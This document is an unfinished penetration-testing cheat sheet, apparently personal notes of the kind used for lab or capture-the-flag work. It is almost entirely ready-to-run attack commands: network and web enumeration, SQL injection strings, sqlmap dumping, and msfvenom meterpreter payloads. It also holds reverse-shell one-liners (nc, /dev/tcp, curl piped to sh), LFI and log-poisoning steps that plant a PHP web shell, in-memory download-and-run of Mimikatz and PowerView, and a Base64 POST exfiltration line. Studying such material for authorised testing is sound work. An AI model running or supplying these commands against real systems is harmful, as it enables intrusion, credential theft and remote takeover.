WORK IN PROGRESS

# Basic Enumeration

#### NMAP check for live hosts
- `sudo nmap -sn 10.0.0.0/24 -oN discovery.nmap`

#### sort
- `cat discovery.nmap | grep "for" | cut -d " " -f 5 > ips.txt` 

#### NMAP scan
- `sudo nmap -sV -n -v -Pn -p- -T4 -iL ips.txt -A --open`

#### NMAP Scan
- `sudo nmap -sC -sV -oA testbox 10.0.0.1`

#### Other type scans
- `nc -nv -u -z -w 1 192.168.1.44 1300-1500`

### Web Directory Enumeration
#### gobuster
- `gobuster dir -u http://10.0.0.1 -w /usr/share/wordlists/dirb/big.txt`

#### wfuzz
######  directory    
- `wfuzz -c -z file,/usr/share/wordlists/dirb/big.txt --hc 404 -u 10.0.0.1/FUZZ`  
###### filename + extension  
- `wfuzz -c -z file,/usr/share/wordlists/dirb/big.txt -z file,/usr/share/wordlists/dirb/extensions_common.txt --hc 404 -u 10.0.0.1/FUZZ%FUZ2Z`  
###### deeper enumeration  
- `wfuzz -c -z file,/usr/share/wordlists/dirb/big.txt -z file,/usr/share/wordlists/dirb/big.txt -z file,/usr/share/wordlists/dirb/extensions_common.txt --hc 404 -u 10.0.0.1/FUZZ/FU2Z%FUZ3Z`

#### FFUF
- `ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ` 	Directory Fuzzing
- `ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/indexFUZZ` 	Extension Fuzzing
- `ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/dir/FUZZ.php` 	Page Fuzzing
- `ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v` 	Recursive Fuzzing
- `ffuf -w wordlist.txt:FUZZ -u https://FUZZ.domain.com/` 	Sub-domain Fuzzing
- `ffuf -w wordlist.txt:FUZZ -u http://domain.htb:PORT/ -H 'Host: FUZZ.domain.com' -fs xxx` 	VHost Fuzzing
- `ffuf -w wordlist.txt:FUZZ -u http://sub.domain.com:PORT/admin/admin.php?FUZZ=key -fs xxx` 	Parameter Fuzzing - GET
- `ffuf -w wordlist.txt:FUZZ -u http://sub.domain.com:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx` 	Parameter Fuzzing - POST
- `ffuf -w ids.txt:FUZZ -u http://sub.domain.com:PORT/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx`

### SMB Enumeration

- `enum4linux -a 10.0.0.1`
- `smbclient -U "user" -L 10.0.0.1`
- `showmount -e 10.0.0.1`
- `sudo mount -t cifs //10.0.0.1/share$ smb/ -o user="user"`
- `smbclient \\\\10.0.0.1\\sharename -U guest`

### LDAP Enumeration

- `jxplorer`

### SQLMAP 
- if there is a parameter then one could use sqlmap
- e.g http://10.0.0.1/?id=2
- use burp to get the request page and save it as req.txt
- then run
- `sqlmap -r req.txt --tamper=space2comment --dump-all --dbms mysql`

- try `' or 1=1--` in the username and password field
- enumerate how many columns there are
- `user='UNION SELECT NULL,'test',NULL,NULL--&password=admin`

### msfvenom and msfconsole reverse shell

- `msfvenom -p php/meterpreter_reverse_tcp lhost=10.0.0.1 lport=9998 -o moon.php`

###### msfconsole
- `use exploit/multi/handler`
- `set payload php/meterpreter_reverse_tcp`
- `set LHOST 10.0.0.1`
- `set LPORT 9998`
- `run`

###### Reverse shells

- `mkfifo /tmp/boop;nc IP PORT 0</tmp/boop | /bin/sh -i 2>&1 | tee /tmp/boop`
- `curl http://IP:port/shell.sh | sh`
- `exec("/bin/bash -c 'bash -i > /dev/tcp/IP/PORT 0>&1'");`
- `/bin/bash -c 'bash -i > /dev/tcp/IP/PORT 0>&1'`

- `python3 -c 'import pty; pty.spawn("/bin/bash")'`

###### Web enumeration

LFI
- `http://10.0.0.1/?page=index.php`
- `http://10.0.0.1/?page=../../../etc/passwd`
- `http://10.0.0.1/?page=php://filter/convert.base64-encode/resource=index.php`

Log injection 
- change user agent
- `<?php system($_GET['cmd']); ?>`
- `http://10.0.0.1/?page=../../../var/apache2/access.log?cmd=wget%20http://IP:PORT/shell.php`
- `expect://id`
- `curl -s -X POST --data "<?php system('id'); ?>" "http://10.0.0.1:80/index.php?language=php://input"`

###### Download files

- `Invoke-WebRequest https://<snip>/PowerView.ps1 -OutFile PowerView.ps1`
- `IEX (New-Object Net.WebClient).DownloadString('https://<snip>/Invoke-Mimikatz.ps1')`
- `Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64`
- `bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe`
- `certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe`
- `wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh`
- `curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh`
- `php -r '$file = file_get_contents("https://<snip>/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'`
- `scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip`
- `scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe`
- `Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"`

###### Basic windows Enumeration

Check Windows Patches
- powershell.exe -command Get-HotFix

Display all AD Users and associated info
-  powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerView/powerview.ps1');Get-User
-  powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerView/powerview.ps1');Get-UserProperties -Properties name,memberof,description,info
-  wmic useraccount get/ALL /format:csv

Enable Remote Desktop (requires admin privs)
- set-ItemProperty -Path 'HKLM:\System\CurrentControl\Control\TerminalServer'-name "fDenyTSConnections" -Value 0

Add firewall rule
- powershell.exe -command New-NetFirewallRule -DisplayName "Allow Inbound Poprt 80" - Direction Inbound -LocalPort 80 -Protocol TCP -Action Allow
- powershell.exe -command New-NetFirewallRule -DisplayName "Block Outbound Poprt 80" - Direction Outbound -LocalPort 80 -Protocol TCP -Action Block

View all services
- powershell.exe -command Get-Service

Restart Service
- powershell.exe -command Restart-Service

Configure DNS server
- powershell.exe -command Get-Service Set-DNSClientServerAddress -InterfaceAlias "Ethernet" -ServerAddresses 8.8.8.8

Get a process list
- powershell.exe -command Get-Process
- wmic process get caption,executablepath,commandline /format:csv

Get list of all computers in AD
- powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerView/powerview.ps1');Get-NetComputers

Collection of information by systems, registries and  other info
- powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerView/Information.ps1');Get-Information
